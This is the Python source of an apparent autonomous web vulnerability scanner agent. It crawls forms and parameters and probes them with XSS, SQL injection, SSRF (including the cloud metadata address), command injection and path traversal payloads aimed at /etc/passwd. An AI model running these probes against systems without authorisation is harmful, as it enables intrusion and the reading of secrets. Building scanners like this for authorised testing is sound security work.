"""
Exploit Agent for Nexus Hunter
Performs safe vulnerability testing with ethical payloads
"""

import asyncio
import base64
import json
import random
import re
import time
from typing import Dict, List, Any, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse, urlencode
from dataclasses import dataclass

import httpx
from bs4 import BeautifulSoup
from loguru import logger

from agents.base import BaseAgent


@dataclass
class VulnerabilityPayload:
    """Payload for vulnerability testing"""
    name: str
    payload: str
    description: str
    category: str
    severity: str
    detection_pattern: str


class ExploitAgent(BaseAgent):
    """Autonomous vulnerability testing agent with ethical constraints"""
    
    def __init__(self):
        super().__init__("ExploitAgent")
        self.safe_payloads = self._initialize_safe_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_endpoints: Set[str] = set()
        
        # Safety constraints
        self.max_requests_per_endpoint = 10
        self.request_delay = 1.0  # Delay between requests in seconds
        self.max_concurrent_tests = 3
    
    def _initialize_safe_payloads(self) -> Dict[str, List[VulnerabilityPayload]]:
        """Initialize safe, non-destructive vulnerability payloads"""
        return {
            "xss": [
                VulnerabilityPayload(
                    name="Basic XSS Test",
                    payload="<script>alert('XSS-Test-Nexus')</script>",
                    description="Basic XSS payload to test for reflected XSS",
                    category="Cross-Site Scripting",
                    severity="medium",
                    detection_pattern=r"<script>alert\('XSS-Test-Nexus'\)</script>"
                ),
                VulnerabilityPayload(
                    name="DOM XSS Test",
                    payload="javascript:alert('DOM-XSS-Test')",
                    description="DOM-based XSS test payload",
                    category="Cross-Site Scripting",
                    severity="medium",
                    detection_pattern=r"javascript:alert\('DOM-XSS-Test'\)"
                ),
                VulnerabilityPayload(
                    name="Event Handler XSS",
                    payload="<img src=x onerror=alert('Event-XSS')>",
                    description="Event handler XSS payload",
                    category="Cross-Site Scripting",
                    severity="medium",
                    detection_pattern=r"<img src=x onerror=alert\('Event-XSS'\)>"
                )
            ],
            "sql_injection": [
                VulnerabilityPayload(
                    name="Basic SQL Error Test",
                    payload="' OR 1=1--",
                    description="Basic SQL injection test for error-based detection",
                    category="SQL Injection",
                    severity="high",
                    detection_pattern=r"(SQL|MySQL|Oracle|PostgreSQL).*(error|syntax|exception)"
                ),
                VulnerabilityPayload(
                    name="Union SQL Test",
                    payload="' UNION SELECT 1,2,3--",
                    description="Union-based SQL injection test",
                    category="SQL Injection",
                    severity="high",
                    detection_pattern=r"(SQL|MySQL|Oracle|PostgreSQL).*(error|syntax|exception)"
                ),
                VulnerabilityPayload(
                    name="Time-based Blind SQL",
                    payload="'; WAITFOR DELAY '00:00:05'--",
                    description="Time-based blind SQL injection test",
                    category="SQL Injection",
                    severity="high",
                    detection_pattern="time_delay"  # Special detection method
                )
            ],
            "ssrf": [
                VulnerabilityPayload(
                    name="Local SSRF Test",
                    payload="http://localhost:8080",
                    description="SSRF test targeting localhost",
                    category="Server-Side Request Forgery",
                    severity="high",
                    detection_pattern=r"(localhost|127\.0\.0\.1|internal)"
                ),
                VulnerabilityPayload(
                    name="Cloud Metadata SSRF",
                    payload="http://169.254.169.254/latest/meta-data/",
                    description="SSRF test targeting cloud metadata",
                    category="Server-Side Request Forgery",
                    severity="critical",
                    detection_pattern=r"(meta-data|instance-data|ami-id)"
                )
            ],
            "command_injection": [
                VulnerabilityPayload(
                    name="Basic Command Injection",
                    payload="; echo 'NEXUS-CMD-TEST'",
                    description="Basic command injection test",
                    category="Command Injection",
                    severity="critical",
                    detection_pattern=r"NEXUS-CMD-TEST"
                ),
                VulnerabilityPayload(
                    name="Windows Command Test",
                    payload="& echo NEXUS-WIN-TEST",
                    description="Windows command injection test",
                    category="Command Injection",
                    severity="critical",
                    detection_pattern=r"NEXUS-WIN-TEST"
                )
            ],
            "path_traversal": [
                VulnerabilityPayload(
                    name="Directory Traversal",
                    payload="../../../etc/passwd",
                    description="Unix path traversal test",
                    category="Path Traversal",
                    severity="high",
                    detection_pattern=r"root:.*:0:0:"
                ),
                VulnerabilityPayload(
                    name="Windows Path Traversal",
                    payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    description="Windows path traversal test",
                    category="Path Traversal",
                    severity="high",
                    detection_pattern=r"127\.0\.0\.1.*localhost"
                )
            ]
        }
    
    async def execute(self, target_data: Dict[str, Any], **kwargs) -> Dict[str, Any]:
        """Execute comprehensive vulnerability testing"""
        
        results = {
            "target": target_data.get("target", "unknown"),
            "vulnerabilities": [],
            "tested_endpoints": 0,
            "total_tests": 0,
            "categories_tested": [],
            "scan_metadata": {}
        }
        
        try:
            # Extract web endpoints from reconnaissance data
            web_endpoints = await self._extract_web_endpoints(target_data)
            
            if not web_endpoints:
                logger.warning("No web endpoints found for vulnerability testing")
                return results
            
            # Phase 1: Crawl and discover forms/parameters
            await self.update_progress("endpoint_discovery", {
                "status": "Discovering testable endpoints and parameters",
                "phase": "1/4",
                "endpoints_found": len(web_endpoints)
            })
            
            testable_endpoints = await self._discover_testable_endpoints(web_endpoints)
            results["tested_endpoints"] = len(testable_endpoints)
            
            # Phase 2: XSS Testing
            if not self.is_cancelled():
                await self.update_progress("xss_testing", {
                    "status": "Testing for Cross-Site Scripting vulnerabilities",
                    "phase": "2/4"
                })
                xss_vulns = await self._test_xss_vulnerabilities(testable_endpoints)
                results["vulnerabilities"].extend(xss_vulns)
                results["categories_tested"].append("XSS")
            
            # Phase 3: SQL Injection Testing
            if not self.is_cancelled():
                await self.update_progress("sql_testing", {
                    "status": "Testing for SQL Injection vulnerabilities",
                    "phase": "3/4"
                })
                sql_vulns = await self._test_sql_injection(testable_endpoints)
                results["vulnerabilities"].extend(sql_vulns)
                results["categories_tested"].append("SQL Injection")
            
            # Phase 4: Additional vulnerability tests
            if not self.is_cancelled():
                await self.update_progress("additional_tests", {
                    "status": "Testing for SSRF, Command Injection, and Path Traversal",
                    "phase": "4/4"
                })
                
                # SSRF Testing
                ssrf_vulns = await self._test_ssrf_vulnerabilities(testable_endpoints)
                results["vulnerabilities"].extend(ssrf_vulns)
                
                # Command Injection Testing
                cmd_vulns = await self._test_command_injection(testable_endpoints)
                results["vulnerabilities"].extend(cmd_vulns)
                
                # Path Traversal Testing
                path_vulns = await self._test_path_traversal(testable_endpoints)
                results["vulnerabilities"].extend(path_vulns)
                
                results["categories_tested"].extend(["SSRF", "Command Injection", "Path Traversal"])
            
            # Calculate scan metadata
            results["scan_metadata"] = {
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "high_severity": len([v for v in results["vulnerabilities"] if v.get("severity") == "high"]),
                "critical_severity": len([v for v in results["vulnerabilities"] if v.get("severity") == "critical"]),
                "endpoints_tested": len(testable_endpoints),
                "test_completion": "100%" if not self.is_cancelled() else "cancelled"
            }
            
            results["total_tests"] = sum(len(self.safe_payloads[cat]) for cat in results["categories_tested"])
            
            logger.info(f"ðŸŽ¯ Vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities")
            return results
            
        except Exception as e:
            logger.error(f"âŒ Vulnerability testing failed: {e}")
            raise
    
    async def _extract_web_endpoints(self, target_data: Dict[str, Any]) -> List[str]:
        """Extract web endpoints from reconnaissance data"""
        web_endpoints = []
        
        # Get subdomains from recon data
        subdomains = target_data.get("subdomains", [])
        technologies = target_data.get("technologies", {})
        ports = target_data.get("ports", {})
        
        for subdomain in subdomains:
            # Check if subdomain has web services
            subdomain_ports = ports.get(subdomain, [])
            
            if 80 in subdomain_ports or 443 in subdomain_ports:
                # Add both HTTP and HTTPS if ports are open
                if 443 in subdomain_ports:
                    web_endpoints.append(f"https://{subdomain}")
                if 80 in subdomain_ports:
                    web_endpoints.append(f"http://{subdomain}")
            else:
                # Default to HTTPS for subdomains with web tech
                if subdomain in technologies:
                    web_endpoints.append(f"https://{subdomain}")
        
        return web_endpoints
    
    async def _discover_testable_endpoints(self, web_endpoints: List[str]) -> List[Dict[str, Any]]:
        """Discover endpoints with testable parameters"""
        testable_endpoints = []
        
        for endpoint in web_endpoints[:5]:  # Limit for safety
            if self.is_cancelled():
                break
            
            try:
                discovered = await self._crawl_endpoint(endpoint)
                testable_endpoints.extend(discovered)
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logger.warning(f"Failed to crawl {endpoint}: {e}")
        
        return testable_endpoints
    
    async def _crawl_endpoint(self, base_url: str) -> List[Dict[str, Any]]:
        """Crawl an endpoint to discover forms and parameters"""
        endpoints = []
        
        try:
            async with httpx.AsyncClient(
                timeout=15.0,
                follow_redirects=True,
                verify=False  # For testing purposes
            ) as client:
                
                # Get the main page
                response = await client.get(base_url)
                if response.status_code >= 400:
                    return endpoints
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                forms = soup.find_all('form')
                for form in forms:
                    form_data = await self._analyze_form(form, base_url)
                    if form_data:
                        endpoints.append(form_data)
                
                # Find links with parameters
                links = soup.find_all('a', href=True)
                for link in links:
                    href = link['href']
                    if '?' in href and '=' in href:
                        full_url = urljoin(base_url, href)
                        parsed = urlparse(full_url)
                        if parsed.query:
                            endpoints.append({
                                "url": full_url,
                                "method": "GET",
                                "parameters": list(parse_qs(parsed.query).keys()),
                                "type": "url_parameter"
                            })
                
        except Exception as e:
            logger.warning(f"Crawling failed for {base_url}: {e}")
        
        return endpoints
    
    async def _analyze_form(self, form, base_url: str) -> Optional[Dict[str, Any]]:
        """Analyze a form to extract testable parameters"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            # Build form URL
            if action:
                form_url = urljoin(base_url, action)
            else:
                form_url = base_url
            
            # Extract input fields
            inputs = form.find_all(['input', 'textarea', 'select'])
            parameters = []
            
            for input_elem in inputs:
                input_type = input_elem.get('type', 'text').lower()
                name = input_elem.get('name')
                
                if name and input_type not in ['submit', 'button', 'hidden']:
                    parameters.append({
                        "name": name,
                        "type": input_type,
                        "value": input_elem.get('value', '')
                    })
            
            if parameters:
                return {
                    "url": form_url,
                    "method": method,
                    "parameters": parameters,
                    "type": "form"
                }
                
        except Exception as e:
            logger.warning(f"Form analysis failed: {e}")
        
        return None
    
    async def _test_xss_vulnerabilities(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        xss_payloads = self.safe_payloads["xss"]
        
        for endpoint in endpoints:
            if self.is_cancelled():
                break
            
            for payload_info in xss_payloads:
                try:
                    vulnerability = await self._test_endpoint_with_payload(
                        endpoint, payload_info, "xss"
                    )
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        logger.info(f"ðŸš¨ XSS vulnerability found: {endpoint['url']}")
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.warning(f"XSS test failed for {endpoint['url']}: {e}")
        
        return vulnerabilities
    
    async def _test_sql_injection(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        sql_payloads = self.safe_payloads["sql_injection"]
        
        for endpoint in endpoints:
            if self.is_cancelled():
                break
            
            for payload_info in sql_payloads:
                try:
                    vulnerability = await self._test_endpoint_with_payload(
                        endpoint, payload_info, "sql_injection"
                    )
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        logger.info(f"ðŸš¨ SQL Injection vulnerability found: {endpoint['url']}")
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.warning(f"SQL injection test failed for {endpoint['url']}: {e}")
        
        return vulnerabilities
    
    async def _test_ssrf_vulnerabilities(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for SSRF vulnerabilities"""
        vulnerabilities = []
        ssrf_payloads = self.safe_payloads["ssrf"]
        
        for endpoint in endpoints:
            if self.is_cancelled():
                break
            
            # Only test parameters that might accept URLs
            url_parameters = [p for p in endpoint.get("parameters", []) 
                            if isinstance(p, dict) and 
                            any(keyword in p.get("name", "").lower() 
                                for keyword in ["url", "link", "redirect", "callback", "webhook"])]
            
            if not url_parameters:
                continue
            
            for payload_info in ssrf_payloads:
                try:
                    vulnerability = await self._test_endpoint_with_payload(
                        endpoint, payload_info, "ssrf", target_params=url_parameters
                    )
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        logger.info(f"ðŸš¨ SSRF vulnerability found: {endpoint['url']}")
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.warning(f"SSRF test failed for {endpoint['url']}: {e}")
        
        return vulnerabilities
    
    async def _test_command_injection(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        cmd_payloads = self.safe_payloads["command_injection"]
        
        for endpoint in endpoints:
            if self.is_cancelled():
                break
            
            for payload_info in cmd_payloads:
                try:
                    vulnerability = await self._test_endpoint_with_payload(
                        endpoint, payload_info, "command_injection"
                    )
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        logger.info(f"ðŸš¨ Command Injection vulnerability found: {endpoint['url']}")
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.warning(f"Command injection test failed for {endpoint['url']}: {e}")
        
        return vulnerabilities
    
    async def _test_path_traversal(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for path traversal vulnerabilities"""
        vulnerabilities = []
        path_payloads = self.safe_payloads["path_traversal"]
        
        for endpoint in endpoints:
            if self.is_cancelled():
                break
            
            # Only test file-related parameters
            file_parameters = [p for p in endpoint.get("parameters", [])
                             if isinstance(p, dict) and
                             any(keyword in p.get("name", "").lower()
                                 for keyword in ["file", "path", "document", "template", "include"])]
            
            if not file_parameters:
                continue
            
            for payload_info in path_payloads:
                try:
                    vulnerability = await self._test_endpoint_with_payload(
                        endpoint, payload_info, "path_traversal", target_params=file_parameters
                    )
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        logger.info(f"ðŸš¨ Path Traversal vulnerability found: {endpoint['url']}")
                    
                    await asyncio.sleep(self.request_delay)
                    
                except Exception as e:
                    logger.warning(f"Path traversal test failed for {endpoint['url']}: {e}")
        
        return vulnerabilities
    
    async def _test_endpoint_with_payload(
        self, 
        endpoint: Dict[str, Any], 
        payload_info: VulnerabilityPayload,
        vuln_type: str,
        target_params: Optional[List[Dict]] = None
    ) -> Optional[Dict[str, Any]]:
        """Test an endpoint with a specific payload"""
        
        try:
            # Prepare request data
            url = endpoint["url"]
            method = endpoint["method"]
            parameters = target_params or endpoint.get("parameters", [])
            
            if not parameters:
                return None
            
            # Build test data
            test_data = {}
            vulnerable_param = None
            
            for param in parameters:
                param_name = param.get("name") if isinstance(param, dict) else param
                if param_name:
                    # Use payload for the first parameter, normal values for others
                    if vulnerable_param is None:
                        test_data[param_name] = payload_info.payload
                        vulnerable_param = param_name
                    else:
                        test_data[param_name] = "test"
            
            # Record baseline timing for time-based tests
            baseline_time = None
            if payload_info.detection_pattern == "time_delay":
                baseline_time = await self._measure_response_time(url, method, {})
            
            # Send test request
            async with httpx.AsyncClient(
                timeout=30.0 if payload_info.detection_pattern == "time_delay" else 15.0,
                follow_redirects=True,
                verify=False
            ) as client:
                
                start_time = time.time()
                
                if method == "GET":
                    response = await client.get(url, params=test_data)
                else:
                    response = await client.post(url, data=test_data)
                
                response_time = time.time() - start_time
                
                # Check for vulnerability
                is_vulnerable = await self._check_vulnerability_response(
                    response, payload_info, baseline_time, response_time
                )
                
                if is_vulnerable:
                    return {
                        "title": f"{payload_info.category} in {vulnerable_param}",
                        "description": payload_info.description,
                        "severity": payload_info.severity,
                        "category": payload_info.category,
                        "url": url,
                        "method": method,
                        "parameter": vulnerable_param,
                        "payload": payload_info.payload,
                        "evidence": {
                            "response_status": response.status_code,
                            "response_time": response_time,
                            "response_snippet": response.text[:500] if len(response.text) > 500 else response.text
                        },
                        "confidence": 80,  # Medium confidence for automated testing
                        "poc": f"Parameter '{vulnerable_param}' is vulnerable to {payload_info.category}"
                    }
                
        except Exception as e:
            logger.warning(f"Payload test failed: {e}")
        
        return None
    
    async def _check_vulnerability_response(
        self, 
        response: httpx.Response, 
        payload_info: VulnerabilityPayload,
        baseline_time: Optional[float],
        response_time: float
    ) -> bool:
        """Check if response indicates a vulnerability"""
        
        try:
            # Time-based detection (SQL injection)
            if payload_info.detection_pattern == "time_delay":
                if baseline_time and response_time > baseline_time + 4.0:  # 4 second delay tolerance
                    return True
            
            # Pattern-based detection
            else:
                response_text = response.text.lower()
                headers_text = str(response.headers).lower()
                
                # Check for pattern in response body
                if re.search(payload_info.detection_pattern.lower(), response_text, re.IGNORECASE):
                    return True
                
                # Check for pattern in headers
                if re.search(payload_info.detection_pattern.lower(), headers_text, re.IGNORECASE):
                    return True
                
                # XSS specific checks
                if payload_info.category == "Cross-Site Scripting":
                    if payload_info.payload.lower() in response_text:
                        return True
                
                # SQL injection specific checks
                if payload_info.category == "SQL Injection":
                    sql_errors = [
                        "mysql", "sql syntax", "ora-", "postgresql", "sqlite",
                        "syntax error", "mysql_fetch", "warning:", "error:",
                        "exception", "stack trace", "line 1", "operand should contain 1 column"
                    ]
                    
                    for error in sql_errors:
                        if error in response_text:
                            return True
        
        except Exception as e:
            logger.warning(f"Vulnerability check failed: {e}")
        
        return False
    
    async def _measure_response_time(self, url: str, method: str, data: Dict) -> float:
        """Measure baseline response time for time-based tests"""
        try:
            async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
                start_time = time.time()
                
                if method == "GET":
                    await client.get(url, params=data)
                else:
                    await client.post(url, data=data)
                
                return time.time() - start_time
                
        except Exception:
            return 1.0  # Default baseline 